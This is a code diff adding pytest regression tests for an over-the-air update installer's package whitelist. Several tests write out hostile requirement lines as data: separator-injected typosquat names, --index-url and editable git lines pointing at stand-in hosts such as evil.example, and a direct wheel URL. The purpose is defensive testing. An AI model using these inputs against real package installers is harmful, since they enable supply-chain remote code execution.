@@ -9,6 +9,7 @@ import io
 import shutil
 import tarfile
 import tempfile
+from pathlib import Path
 
 import pytest
 from unittest.mock import patch, MagicMock
@@ -160,6 +161,88 @@ class TestInstallRequirements:
         with pytest.raises(UpdateError, match="Unknown packages"):
             update_manager._install_requirements(req_file)
 
+        mock_run.assert_not_called()
+
+    @pytest.mark.satellite
+    @patch("subprocess.run")
+    def test_shipped_requirements_pass_validation(self, mock_run, update_manager):
+        """The REAL src/satellite/requirements.txt must pass the whitelist.
+
+        Regression guard for the OTA outage: soundcard / pymicro-wakeword /
+        pyopen-wakeword / bleak were missing from SAFE_PACKAGES and RPi.GPIO
+        failed dot-normalization, so the installer rejected the satellite's own
+        deps and rolled every update back. This ties the whitelist to the actual
+        shipped requirements so they can't drift apart again.
+        """
+        mock_run.return_value = MagicMock(returncode=0)
+        req_file = (
+            Path(__file__).resolve().parents[2]
+            / "src" / "satellite" / "requirements.txt"
+        )
+        assert req_file.exists(), f"shipped requirements not found at {req_file}"
+
+        # Must not raise — every uncommented dep is whitelisted.
+        update_manager._install_requirements(req_file)
+        mock_run.assert_called_once()
+
+    @pytest.mark.satellite
+    @patch("subprocess.run")
+    def test_rpi_gpio_and_inline_comments_pass(self, mock_run, update_manager, tmp_path):
+        """RPi.GPIO (dot) + inline comments must not trip the whitelist."""
+        mock_run.return_value = MagicMock(returncode=0)
+        req_file = tmp_path / "requirements.txt"
+        req_file.write_text(
+            "RPi.GPIO>=0.7.1  # GPIO for button\n"
+            "soundcard>=0.4.0  # capture\n"
+            "pymicro-wakeword>=2.0.0\n"
+            "bleak>=0.22.0\n"
+        )
+        update_manager._install_requirements(req_file)
+        mock_run.assert_called_once()
+
+    @pytest.mark.satellite
+    @patch("subprocess.run")
+    def test_separator_impersonation_rejected(self, mock_run, update_manager, tmp_path):
+        """A name with injected separators must NOT collapse onto a whitelisted one.
+
+        PEP 503 collapses runs of -_. to a single '-', so `s.o.u.n.d.c.a.r.d`
+        canonicalizes to `s-o-u-n-d-c-a-r-d` — a DISTINCT PyPI project from
+        `soundcard`, not a match. Deleting separators (the first cut at this fix)
+        would have let an attacker register that project and get OTA RCE.
+        """
+        for evil in ("s.o.u.n.d.c.a.r.d==9.9.9\n", "s-o-u-n-d-c-a-r-d==9.9.9\n",
+                     "n.u.m.p.y==9.9.9\n"):
+            req_file = tmp_path / "requirements.txt"
+            req_file.write_text(evil)
+            with pytest.raises(UpdateError, match="Unknown packages"):
+                update_manager._install_requirements(req_file)
+        mock_run.assert_not_called()
+
+    @pytest.mark.satellite
+    @patch("subprocess.run")
+    def test_pip_option_lines_rejected(self, mock_run, update_manager, tmp_path):
+        """`--index-url`/`-e`/`-r` lines must be rejected, not silently skipped.
+
+        pip honours options inside a `-r` file, so a skipped `--index-url` could
+        repoint the whole install at an attacker index even with legit names.
+        """
+        for evil in ("--index-url https://evil.example/simple\nnumpy==1.0\n",
+                     "--extra-index-url https://evil/simple\n",
+                     "-e git+https://evil/x.git#egg=numpy\n"):
+            req_file = tmp_path / "requirements.txt"
+            req_file.write_text(evil)
+            with pytest.raises(UpdateError):
+                update_manager._install_requirements(req_file)
+        mock_run.assert_not_called()
+
+    @pytest.mark.satellite
+    @patch("subprocess.run")
+    def test_direct_url_reference_rejected(self, mock_run, update_manager, tmp_path):
+        """`pkg @ https://…` must fail the allowlist (URL kept in the token)."""
+        req_file = tmp_path / "requirements.txt"
+        req_file.write_text("soundcard @ https://evil.example/x.whl\n")
+        with pytest.raises(UpdateError, match="Unknown packages"):
+            update_manager._install_requirements(req_file)
         mock_run.assert_not_called()
 
 
